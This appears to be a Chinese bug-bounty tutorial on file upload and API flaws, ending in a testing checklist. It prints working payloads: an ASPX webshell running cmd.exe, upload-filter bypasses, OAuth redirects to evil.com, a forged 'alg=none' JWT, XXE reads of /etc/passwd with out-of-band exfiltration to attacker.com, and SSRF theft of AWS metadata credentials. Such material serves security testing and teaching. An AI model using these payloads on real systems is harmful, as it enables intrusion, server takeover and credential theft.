# SRC实战报告：文件上传与API安全漏洞案例集

> **文件上传**和**API安全**是SRC中高危漏洞的高发地带，一个文件上传RCE能直接拿到服务器权限。
> **关联知识**：[命令注入全技巧](11-command-injection.md) | [XXE注入全技巧](16-xxe.md) | [反序列化注入全技巧](18-deserialization.md) | [软件和数据完整性失效（A08）全技巧](27-a08-integrity-failures.md)

---

## 一、文件上传漏洞实战案例

### 案例1：某CMS后台文件上传RCE

**场景**：后台编辑器的附件上传功能  
**漏洞类型**：未校验文件内容 + 黑名单过滤不严

```http
# 原始请求
POST /admin/editor/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----xxx

------xxx
Content-Disposition: form-data; name="file"; filename="test.jpg"
Content-Type: image/jpeg

[图片二进制数据]

# 攻击请求 - 修改扩展名
POST /admin/editor/upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----xxx

------xxx
Content-Disposition: form-data; name="file"; filename="test.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#" %>
<% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c whoami").ReadToEnd()); %>
```

### 案例2：二次扩展名绕过

**场景**：只检查了最后一个扩展名

| 绕过方式 | Payload |
|:---|:---|
| 双扩展名 | `shell.php.jpg` → 某些中间件解析为php |
| 分号截断 | `shell.php;.jpg` → 某些系统截断为.php |
| 空字符截断 | `shell.php%00.jpg` → 老版本PHP截断 |
| \`.htaccess\`覆盖 | 先上传.htaccess，再上传无扩展名文件解析为php |

### 案例3：Content-Type绕过

```http
# 修改 Content-Type 绕过前端JS校验
Content-Type: image/jpeg  →  正常
Content-Type: image/gif   →  可尝试
Content-Type: application/octet-stream  →  某些场景可用

# 同时修改文件幻数（Magic Number）
上传文件头部添加GIF89a → 绕过文件内容检测
```

### 案例4：SOAP接口文件上传被IP限制

**场景**：某企业的Web Service (.asmx) 暴露了文件上传接口

```java
// 尝试调用文件上传接口
// 结果：对方服务器积极拒绝连接
// 原因：管理员对调用文件上传接口的IP做了白名单限制

// 绕过思路：尝试X-Forwarded-For头伪造
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
```

---

## 二、API未授权访问案例

### 案例5：Swagger文档泄露 → 全量API泄露

**场景**：Swagger UI未加任何认证

```http
# 访问Swagger文档
GET /swagger-ui.html HTTP/1.1
→ 200 OK（所有API接口文档全公开）

# 找到未授权的用户查询接口
GET /api/v1/users/list HTTP/1.1
→ 返回所有用户信息（手机号、邮箱、角色）
```

### 案例6：GraphQL接口数据泄露

```graphql
# 正常查询
query {
  user(id: 1) {
    name
    email
  }
}

# 恶意查询 - 批量获取数据
query {
  users(first: 1000) {
    edges {
      node {
        name
        email
        phone
        address
      }
    }
  }
}
```

### 案例7：API接口无速率限制

```http
# 暴力枚举用户ID
GET /api/user/1 → 200 OK
GET /api/user/2 → 200 OK
GET /api/user/3 → 200 OK
...
# 无任何频率限制，可遍历全量用户数据
```

---

## 三、OAuth 2.0 / SSO 安全漏洞

### 案例8：OAuth授权劫持

| 漏洞类型 | 描述 |
|:---|:---|
| CSRF + OAuth | 未校验state参数，攻击者可绑定受害者账号 |
| redirect_uri绕过 | 修改回调地址到攻击者服务器窃取code |
| code泄露 | code在URL中明文传输，referer头泄露 |
| token未绑定客户端 | token可被任意应用使用 |

**测试Payload**：

```http
# redirect_uri绕过测试
GET /oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://evil.com/callback&state=xxx

# open redirect + oauth组合
GET /oauth/authorize?response_type=code&client_id=xxx&redirect_uri=https://target.com/redirect?url=https://evil.com
```

### 案例9：JWT安全漏洞

```python
# JWT算法混淆攻击
# 将 RS256（非对称）改为 HS256（对称）
# 使用公钥作为HMAC密钥签名

import jwt

# 原始token
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."

# 修改算法为none
# python-jwt 旧版本支持 alg=none
jwt.encode({"user": "admin", "role": "admin"}, "", algorithm="none")

# 弱密钥爆破
# hashcat -m 16500 jwt.txt rockyou.txt
```

---

## 四、XXE注入实战案例

### 案例10：XML接口XXE → 文件读取

**场景**：SOAP/XML接口未禁用外部实体

```xml
<!-- 读取服务器文件 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <StocktakingStart>
      <whcode>&xxe;</whcode>
    </StocktakingStart>
  </soap:Body>
</soap:Envelope>
```

### 案例11：OOB-XXE（无回显）

```xml
<!-- 外带数据到攻击者服务器 -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>&data;</root>

<!-- evil.dtd内容 -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; data SYSTEM 'http://attacker.com/?f=%file;'>">
%eval;
```

---

## 五、SSRF漏洞案例

### 案例12：云元数据API利用

**场景**：URL参数存在SSRF漏洞

```http
# 读取云服务元数据
GET /proxy?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
→ 返回云服务器实例信息

# AWS 凭证窃取
GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
→ 获取临时凭证
```

> 更多SSRF技巧详见：[服务端请求伪造SSRF（A10）全技巧](15-ssrf.md)

---

## 六、文件上传与API安全测试Checklist

### 文件上传测试点

- [ ] 后缀名黑名单能否绕过？（.php5/.phtml/.asa/.cer）
- [ ] 内容校验能否绕过？（幻数/GIF89a）
- [ ] 是否可直接访问上传目录？
- [ ] 文件名是否被修改？能否包含路径穿越（../）？
- [ ] 是否有上传文件的大小限制？
- [ ] 图片文件是否被二次渲染？能否绕过？
- [ ] 是否可上传.htaccess/web.config？
- [ ] 是否可上传SVG文件实现XXE？

### API安全测试点

- [ ] 接口是否需要认证？（未授权访问）
- [ ] 接口是否有频率限制？（暴力枚举）
- [ ] 接口是否暴露了内部信息？（IP、路径、版本）
- [ ] Swagger/API文档是否公开？
- [ ] GraphQL接口是否存在深度查询攻击？
- [ ] WebSocket接口是否有权限校验？
- [ ] API参数是否可篡改？（越权）
- [ ] API是否返回了多余的敏感字段？

---

## 七、实战心法总结

### 柿子要挑软的捏

```
文件上传优先找：
  1. 测试环境（无WAF、未限制）
  2. 旧版本系统（有已知CVE）
  3. 编辑器插件（富文本/文件管理器）
  4. API接口（通用接口往往防御弱）

API安全优先测：
  1. 新上线接口（测试不充分）
  2. 第三方集成接口（开发容易忽略鉴权）
  3. 旧版API（v1往往比v2防御弱）
```

### 🔗 关联学习

- [命令注入全技巧](11-command-injection.md) - 文件上传执行后的提权
- [XXE注入全技巧](16-xxe.md) - XML相关漏洞详解
- [服务端请求伪造SSRF（A10）全技巧](15-ssrf.md) - SSRF云元数据利用
- [安全配置错误（A05）全技巧](24-a05-security-misconfiguration.md) - 目录遍历和敏感文件
